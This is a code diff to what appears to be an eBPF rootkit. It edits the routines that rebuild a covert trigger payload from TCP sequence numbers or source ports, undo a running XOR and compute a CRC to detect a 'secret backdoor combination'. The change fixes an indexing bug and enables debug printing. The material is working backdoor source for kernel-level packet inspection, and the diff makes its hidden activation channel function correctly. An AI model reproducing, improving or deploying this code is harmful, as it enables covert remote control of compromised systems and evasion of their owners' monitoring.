@@ -201,32 +201,33 @@ static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_
     //The following routine (not just the next check) is necessarily dirty in terms of programming,
     //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
     char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM] = {0};
+    int p_index = 0;
     if(first_packet == 0){
-        for(int ii=first_packet; ii<3; ii++){
+        for(int ii=first_packet; ii<3; ii++, p_index++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
     }else if(first_packet == 1){
-        for(int ii=first_packet; ii<3; ii++){
+        for(int ii=first_packet; ii<3; ii++, p_index++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
     }else if(first_packet == 2){
-        for(int ii=first_packet; ii<3; ii++){
+        for(int ii=first_packet; ii<3; ii++, p_index++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*ii), &(seq_num), sizeof(__u32));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
     }
     
@@ -321,71 +322,72 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
     }else{
         first_packet = 0;
     } 
-
+    bpf_printk("BACKDOOR 16: FP:%i, LR:%i\n", first_packet, last_received);
     //The following routine is necessarily dirty in terms of programming,
     //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
     char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT] = {0};
+    int p_index = 0;
     if(first_packet == 0){
-        for(int ii=first_packet; ii<6; ii++){
+        for(int ii=first_packet; ii<6; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }else if(first_packet == 1){
-        for(int ii=first_packet; ii<6; ii++){
+        for(int ii=first_packet; ii<6; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }else if(first_packet == 2){
-        for(int ii=first_packet; ii<6; ii++){
+        for(int ii=first_packet; ii<6; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }else if(first_packet == 3){
-        for(int ii=first_packet; ii<6; ii++){
+        for(int ii=first_packet; ii<6; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }else if(first_packet == 4){
-        for(int ii=first_packet; ii<6; ii++){
+        for(int ii=first_packet; ii<6; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }else if(first_packet == 5){
-        for(int ii=first_packet; ii<6; ii++){
+        for(int ii=first_packet; ii<6; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
-        for(int ii=0; ii<first_packet; ii++){
+        for(int ii=0; ii<first_packet; ii++, p_index++){
             __u16 src_port = b_data.trigger_array[ii].src_port;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*ii), &(src_port), sizeof(__u16));
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }
     
-    /*bpf_printk("Payload before XOR: ");
+    bpf_printk("Payload before XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
         bpf_printk("%x", payload[ii]);
     }
-    bpf_printk("\n");*/
+    bpf_printk("\n");
 
     //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
     //First undo running XOR
@@ -394,11 +396,11 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
         __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
     }
 
-    /*bpf_printk("Payload after XOR: ");
+    bpf_printk("Payload after XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
         bpf_printk("%x", payload[ii]);
     }
-    bpf_printk("\n");*/
+    bpf_printk("\n");
 
     //Now compute CRC
     __u8 x;
